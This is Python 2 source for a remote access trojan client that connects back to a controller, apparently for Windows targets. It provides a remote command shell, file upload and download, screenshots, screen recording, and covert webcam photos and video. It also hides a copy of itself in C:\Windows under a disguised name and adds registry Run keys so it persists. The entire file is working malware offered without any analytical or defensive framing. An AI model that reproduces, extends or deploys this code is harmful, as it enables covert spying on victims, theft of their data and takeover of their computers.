#-*- coding: utf-8 -*
import socket
import sys
import os
import time
import struct
import cv2
from PIL import ImageGrab


class Client:
    def __init__(self,ip,port):
        self.addr = ip,port
        print "[+]Init Successfully..."

    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect(self.addr)
                print "[+]Connect Successfully..."
                break
            except Exception as e:
                self.sock.close()
                print "[-]Waiting:"+str(e)
                time.sleep(5)


    def check(self):
        while True:
            try:
                getcmd = self.sock.recv(1024)
                if getcmd == "shell":
                    self.shell()
                elif getcmd == "state":
                    self.sock.sendall("state")
                elif getcmd == "download":
                    self.filesend()
                elif getcmd == "upload":
                    self.filerecv()
                elif getcmd == "screenshot":
                    self.screenshot()
                elif getcmd == "screen_stream":
                    self.screen_stream()
                elif getcmd == "webcam_snap":
                    try:
                        cv2.VideoCapture(0).release()
                        flag = 1
                    except:
                        flag = 0
                    if flag:
                        self.sock.sendall("cam_start")
                        self.webcam_snap()
                    else:
                        self.sock.sendall("No_cam")
                elif getcmd == "webcam_stream":
                    try:
                        cv2.VideoCapture(0).release()
                        flag = 1
                    except:
                        flag = 0
                    if flag:
                        self.sock.sendall("cam_start")
                        self.webcam_stream()
                    else:
                        self.sock.sendall("No_cam")
                elif getcmd == "close":
                    self.close()
                elif getcmd == "end":
                    self.close()
                    self.end()
                    return 1
                else:
                    self.sock.sendall(" ")
            except Exception as e:
                print "[-]Failed:"+str(e)
                break


    def screenshot(self):
        print "[+]Screenshot:Start"
        im = ImageGrab.grab()
        filepath = 'AX.jpg'
        im.save(filepath,'jpeg')
        self.filesend(filepath)
        os.remove(filepath)
        print "[+]Screenshot:Exit"


    def screen_stream(self):
        print "[+]Screen Stream:Start"
        filepath = 'outs.avi'
        sec = int(self.sock.recv(1024))
        fps = int(self.sock.recv(1024))
        sle = float(self.sock.recv(1024))
        if sec <= 0:
            sec = 5
        bef = int(time.time())
        out = cv2.VideoWriter(filepath, cv2.VideoWriter_fourcc(*'MJPG'), fps, (1920, 1080))
        while int(time.time()) - bef < sec:
            im = ImageGrab.grab()
            im.save("temp.jpg", "jpeg")
            data = cv2.imread("temp.jpg")
            out.write(data)
        out.release()
        self.filesend(filepath)
        os.remove("temp.jpg")
        os.remove(filepath)
        print "[+]Screen Stream:Exit"


    def webcam_stream(self):
        print "[+]Record Video:Start"
        filepath = 'outs.avi'
        sec = int(self.sock.recv(1024))
        fps = int(self.sock.recv(1024))
        sle = int(self.sock.recv(1024))
        if sec <= 0:
            sec = 5
        bef = int(time.time())
        cap = cv2.VideoCapture(0)
        out = cv2.VideoWriter(filepath,cv2.VideoWriter_fourcc(*'MJPG'),fps,(640,480))
        while int(time.time()) - bef < sec:
            ret, frame = cap.read()
            cv2.imwrite("temp.jpg",frame)
            data = cv2.imread("temp.jpg")
            out.write(data)
            time.sleep(sle)
        out.release()
        cap.release()
        self.filesend(filepath)
        os.remove("temp.jpg")
        os.remove(filepath)
        print "[+]Record Video:Exit"


    def webcam_snap(self):
        print "[+]Taking Photo"
        cap = cv2.VideoCapture(0)
        filepath = "photo.jpg"
        ret, frame = cap.read()
        while not ret:
            ret, frame = cap.read()
        cv2.imwrite(filepath,frame)
        cap.release()
        cv2.destroyAllWindows()
        self.filesend(filepath)
        os.remove(filepath)
        print "[+]Photo:Exit"


    def filesend(self,filepath=""):
        print "[+]FileSend:Start"
        if not filepath:
            filepath = self.sock.recv(1024)
        if os.path.isfile(filepath):
            struct.calcsize("128sI")
            filehead = struct.pack('128sI',os.path.basename(filepath),os.stat(filepath).st_size)
            self.sock.sendall(filehead)
            fp = open(filepath,"rb")
            while True:
                data = fp.read(1024)
                if not data:
                    break
                self.sock.sendall(data)
            fp.close()
            print "[+]Uploaded:"+filepath
        else:
            self.sock.sendall(filepath+":File Not Exist")
            print "[-]"+filepath+":File Not Exist"
        print "[+]FileSend:Exit"




    def filerecv(self):
        print "[+]FileRecv:Start"
        fileinfo_size = struct.calcsize("128sI")
        filehead = self.sock.recv(fileinfo_size)
        filename,filesize = struct.unpack("128sI",filehead)
        filename = filename.strip('\00')
        fp = open(filename,'wb')
        recved_size = 0
        while not recved_size == filesize:
            if filesize - recved_size > 1024:
                data = self.sock.recv(1024)
                recved_size += len(data)
            else:
                data = self.sock.recv(filesize - recved_size)
                recved_size = filesize
            fp.write(data)
        fp.close()
        print "[+]Downloaded:" + filename
        self.sock.sendall("[+]Uploaded"+filename)
        print "[+]FileRecv:Exit"


    def shell(self):
        self.sock.sendall("shell")
        print "[+]Shell:Start"
        while True:
            cmd = self.sock.recv(1024)
            if not cmd:
                continue
            if not cmd == "exit":
                proc = os.popen(cmd)
                output = proc.read()
                total = len(output)
                if not total:
                    output = "[+]No output"
                    total = len(output)
                self.sock.sendall(str(total))
                time.sleep(1)
                recv_size = 0
                while not total == recv_size:
                    if total - recv_size > 1024:
                        self.sock.sendall(output[recv_size:recv_size + 1023])
                        recv_size += 1024
                    else:
                        self.sock.sendall(output[recv_size:])
                        break
            else:
                print "[+]Shell:Exit"
                break


    def close(self):
        self.sock.close()


    def register(self):
        try:
            cmd = "copy /Y " + sys.argv[0] + " C:\\Windows\\cmds.exe"
            os.popen(cmd)
            if not sys.argv[0] == "C:\\Windows\\cmds.exe":
                cmd = "attrib +S +H C:\\Windows\\cmds.exe"
                os.popen(cmd)
            cmd = r"echo yes|reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RssWps /d C:\Windows\cmds.exe"
            os.popen(cmd)
            cmd = r"echo yes|reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RssWps /d C:\Windows\cmds.exe"
            os.popen(cmd)
            cmd = r"echo yes|reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Wps /d " + sys.argv[0]
            os.popen(cmd)
            cmd = r"echo yes|reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Wps /d " + sys.argv[0]
            os.popen(cmd)
            if not sys.argv[0] == "C:\\Windows\\cmds.exe":
                cmd = r"start explorer C:\Windows\cmds.exe"
                os.popen(cmd)
        except Exception as e:
            print str(e)

    def end(self):
        cmd = r"""taskkill /F /FI "USERNAME eq Administrator" /IM client.exe"""
        os.popen(cmd)



def main():
    cc = Client('127.0.0.1',12314)
    cc.register()

    while True:
        cc.connect()
        if cc.check() == 1:
            return


if __name__ == '__main__':
    main()

